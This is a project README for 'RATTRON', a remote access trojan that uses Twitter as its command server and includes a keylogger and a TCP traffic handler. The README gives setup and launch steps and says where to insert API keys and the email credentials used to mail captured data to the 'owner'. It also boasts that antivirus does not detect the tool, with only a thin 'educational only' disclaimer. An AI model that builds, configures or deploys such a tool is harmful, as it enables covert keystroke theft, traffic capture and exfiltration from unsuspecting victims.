# RATTRON

RATTRON is a simple example of remote access tool that use twitter as command server. Including keylogger and tcp packets handler.

##### I am not responsible for how you will use this application. This app is for educational only.
----------
##### How to install

  ```sh
  git clone https://github.com/bychok300/rattron
  cd rattron
  npm install
  ```

#### Quick tutorial
```js
    //open main.js file
    //it contains rat functionality
    //pass your keys to get twitter access
    let client = new Twitter({
        consumer_key: 'YOUR_KEY',
        consumer_secret: 'YOUR_KEY',
        access_token_key: 'YOUR_KEY',
        access_token_secret: 'YOUR_KEY'
    });
```
After you need pass email credentials in `sendMailToOwner` function.
Finally you can run app using
```sh
npm start
```
-----------

for executed file for all platforms see [electron packager](https://github.com/electron-userland/electron-packager)
#### Keylogger and TCP handler

`rattron/Utils/loggerNtcpHandler.js` contains all function to handle tcp traffic and key press events.
If you want use it just copy this code and replace code in main.js

#### notice that loggerNtcpHandler.js does't contains functions for sending created files to attacker

this is it :^) Virus total test doesn't recognize any malware or trojan or somthing bad. It tool fully unvisible for antivirus
feel free to ask your quiestions, contribute to project and do whatever you want)

if you like this app you may donate me. bitcoin: 17jJDW8z9KVsueY4P7g33jrJhZbD9GxsBY